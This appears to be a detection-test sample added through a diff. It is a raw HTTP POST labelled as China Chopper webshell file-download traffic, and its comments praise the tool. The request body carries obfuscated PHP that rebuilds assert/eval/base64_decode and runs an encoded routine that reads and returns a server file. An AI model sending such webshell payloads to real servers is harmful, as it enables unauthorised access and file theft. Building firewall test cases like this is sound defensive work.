@@ -1,0 +1,13 @@
+# webshell活动_菜刀_PHP_文件下载
+# 中国菜刀，一个非常好用而又强大的webshell，是一款专业的网站管理软件，大小只有300多KB，小巧实用。
+# 通过菜刀 webshell工具建立连接，下载任意文件
+POST /shell.php?acid=80002224&bid=hd_tag_m8mv25ln HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25ln
+RM-PRO-Token: 9e1885639c54ff551798ff2ee7a11b7f
+RM-PRO-Time: 1742808479031
+User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
+Content-Length: 486
+Content-Type: application/x-www-form-urlencoded
+
+cmd=array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JEY9IkM6XFxwaHBzdHVkeV9wcm9cXFdXV1xcaW5kZXgucGhwIjskZnA9QGZvcGVuKCRGLCdyJyk7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oJ0VSUk9SOi8vIENhbiBOb3QgUmVhZCcpO307ZWNobygiWEBZIik7ZGllKCk7'));\");"));&act=login
